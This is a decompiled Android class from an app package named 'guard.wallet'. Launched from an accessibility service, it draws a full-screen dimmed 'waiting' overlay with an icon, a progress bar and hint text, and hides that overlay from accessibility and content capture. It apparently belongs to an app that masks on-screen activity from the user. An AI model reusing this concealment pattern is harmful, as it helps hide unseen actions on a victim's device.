package e0;

import a1.AbstractC0026q;
import android.graphics.Color;
import android.os.Build;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.TextView;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0248d;
import java.lang.ref.WeakReference;
import java.util.Objects;
import org.bouncycastle.tls.CipherSuite;

/* renamed from: e0.i */
/* loaded from: classes.dex */
public final class C0271i extends LinearLayout {

    /* renamed from: a */
    public WeakReference f453a;

    public C0271i(MyAccessibilityService myAccessibilityService, String str) {
        super(myAccessibilityService);
        setOrientation(1);
        setGravity(17);
        setSystemUiVisibility(4);
        setImportantForAccessibility(2);
        if (Build.VERSION.SDK_INT >= 30) {
            setImportantForContentCapture(2);
        }
        setBackgroundColor(Color.argb(0.6f, 0.0f, 0.0f, 0.0f));
        C0265c c0265c = new C0265c(myAccessibilityService);
        if (!c0265c.m742a()) {
            c0265c.setImageURL(AbstractC0248d.m604b());
        }
        c0265c.setTag("waiting-icon-image");
        addView(c0265c, 0);
        View c0268f = new C0268f(myAccessibilityService);
        addView(c0268f, 1);
        c0268f.setTag("waiting-progress-bar");
        this.f453a = new WeakReference(c0268f);
        if (AbstractC0026q.m151B(str)) {
            return;
        }
        TextView textView = new TextView(myAccessibilityService);
        textView.setTag("waiting-hint-text");
        textView.setText(str);
        textView.setSingleLine(false);
        textView.setTextColor(-1);
        textView.setBackgroundColor(0);
        textView.setTextSize(15.0f);
        textView.setTextAlignment(4);
        textView.setGravity(17);
        textView.setPadding(0, 10, 0, 10);
        addView(textView, 2);
    }

    @Override // android.widget.LinearLayout, android.view.ViewGroup, android.view.View
    public final void onLayout(boolean z2, int i2, int i3, int i4, int i5) {
        int i6;
        int i7;
        int childCount = getChildCount();
        if (childCount > 0) {
            int i8 = ((i5 - i3) / 2) + i3;
            for (int i9 = 0; i9 < childCount; i9++) {
                View childAt = getChildAt(i9);
                if (Objects.equals(childAt.getTag(), "waiting-icon-image")) {
                    int i10 = i4 - i2;
                    int i11 = (i10 - ((int) (i10 * 0.4f))) / 2;
                    int i12 = ((i8 - 160) - 10) - 50;
                    childAt.layout(i11, i12, i4 - i11, i12 + CipherSuite.TLS_DH_RSA_WITH_AES_128_GCM_SHA256);
                } else {
                    if (Objects.equals(childAt.getTag(), "waiting-progress-bar")) {
                        i6 = i8 - 10;
                        i7 = i6 + 20;
                    } else {
                        i6 = i8 + 10 + 50;
                        i7 = i6 + 200;
                    }
                    childAt.layout(i2, i6, i4, i7);
                }
            }
        }
    }
}
